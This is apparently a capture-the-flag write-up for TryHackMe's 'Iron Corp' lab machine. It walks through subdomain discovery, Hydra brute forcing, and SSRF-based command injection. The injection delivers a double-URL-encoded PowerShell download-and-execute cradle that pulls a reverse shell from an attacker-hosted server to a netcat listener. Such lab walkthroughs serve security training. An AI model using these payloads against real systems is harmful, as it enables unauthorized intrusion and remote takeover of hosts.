# [Iron Corp](https://tryhackme.com/room/ironcorp)

## Can you get access to Iron Corp's system?

# Iron Corp

### user.txt

1. Add the target IP to the hosts file for proper domain resolution

```bash
sudo echo "IP ironcorp.me" >> /etc/hosts
```

2. Perform port scan to identify running services
   - **Results:** The scan reveals services running on multiple ports, including web services on port 11025.

```bash
nmap -p- -sV ironcorp.me
```

[SCREEN01]

3. Attempt a DNS zone transfer to discover additional subdomains
   - **Results:** The zone transfer reveals two additional subdomains: `admin.ironcorp.me` and `internal.ironcorp.me`.

```bash
dig axfr @ironcorp.me ironcorp.me
```

[SCREEN02]

4. Add the discovered subdomains to the hosts file

```bash
sudo sh -c 'echo "IP admin.ironcorp.me" >> /etc/hosts && echo "IP internal.ironcorp.me" >> /etc/hosts'
```

5. The admin panel at `http://admin.ironcorp.me:11025/` requires HTTP Basic Authentication. Use Hydra to brute force the credentials
   - **Credentials found:** `admin:password123`

```bash
hydra -l admin -P /root/Tools/wordlists/rockyou.txt -s 11025 admin.ironcorp.me http-get
```

[SCREEN03]

6. After authenticating to the admin panel, test for SSRF vulnerabilities. The application accepts a parameter `r` that makes requests to internal services
   - Test command injection through SSRF: `http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=test|whoami`
   - **Result:** Command execution confirmed - returns `nt authority\system`, indicating the web service runs with high privileges.

[SCREEN04]

7. Set up a local HTTP server to host the PowerShell reverse shell payload

```bash
python -m SimpleHTTPServer
```

8. Set up a netcat listener to catch the reverse shell

```bash
nc -lvnp 4444
```

9. Download and modify a PowerShell reverse shell script from: [github.com/vulware/powershell-reverse-shell-](https://github.com/vulware/powershell-reverse-shell-/blob/master/powershell%20tcp%20reverse%20shell.ps1)

   - Update the IP address and port in the script to match your attacking machine

10. The SSRF vulnerability requires double URL encoding to bypass filters. Encode the following PowerShell command:

```powershell
powershell.exe -c iex(new-object net.webclient).downloadstring('http://IP:8000/shell.ps1')
```

Using [CyberChef](https://gchq.github.io/CyberChef/), double URL encode the payload:

```
powershell%252Eexe%2520%252Dc%2520iex%2528new%252Dobject%2520net%252Ewebclient%2529%252Edownloadstring%2528%2527http%253A%252F%252F10%252E10%252E240%252E255%253A8000%252Fshell%252Eps1%2527%2529
```

[SCREEN06]

11. Execute the payload through the SSRF vulnerability: `http://admin.ironcorp.me:11025/?r=http://internal.ironcorp.me:11025/name.php?name=test|powershell%252Eexe%2520%252Dc%2520iex%2528new%252Dobject%2520net%252Ewebclient%2529%252Edownloadstring%2528%2527http%253A%252F%252F10%252E10%252E240%252E255%253A8000%252Fshell%252Eps1%2527%2529`

    - This should trigger the reverse shell connection to your netcat listener

12. Navigate to the user directory and retrieve the first flag

```bash
cd C:\Users
more Administrator\Desktop\user.txt
```

[SCREEN05]

---

### root.txt

1. Check access permissions for potential privilege escalation paths, and access the SuperAdmin directory to retrieve the root flag

```bash
get-acl c:\users\SuperAdmin | fl
type c:\users\superadmin\desktop\root.txt
```

[SCREEN07]
